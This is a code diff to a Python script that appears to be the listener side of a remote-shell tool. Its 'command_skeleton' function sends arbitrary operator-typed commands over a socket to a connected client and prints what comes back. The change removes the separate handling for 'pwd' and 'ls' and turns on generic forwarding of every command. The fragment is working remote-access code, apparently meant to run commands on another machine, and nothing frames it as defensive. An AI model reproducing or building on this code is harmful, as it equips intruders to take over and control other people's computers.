@@ -72,28 +72,16 @@ def command_skeleton(conn):
 	while True:
 		try:
 			## doesnt need to be too big 
-			cmd = input("Skeleton > ")
+			cmd = input()
 			if cmd == 'quit':
 				conn.close()
 				s.close()
 				#sys.exit()
 				main()
-			elif cmd == 'pwd':
-				conn.send(cmd.encode())
-				files = conn.recv(BYTES)
-				files = files.decode()
-				print(files)
-			elif cmd == "ls":
-				conn.send(cmd.encode())
-				dir = conn.recv(BYTES)
-				print(dir.decode())
-				for file in dir:
-					print(file)
-			#if len(str.encode(cmd)) > 0:
-			"""else:
+			else:
 				conn.send(str.encode(cmd))
 				client_response = str(conn.recv(BYTES), "utf-8")
-				print(client_response, end="") # end='': dont give a new line at the end of cmd"""
+				print(client_response, end="") # end='': dont give a new line at the end of cmd
 		except KeyboardInterrupt:
 			print("") # Another empty line
 			print("\n" + Style.BRIGHT + Fore.BLUE + "[i] Type 'quit' to close shell" + Style.RESET_ALL)
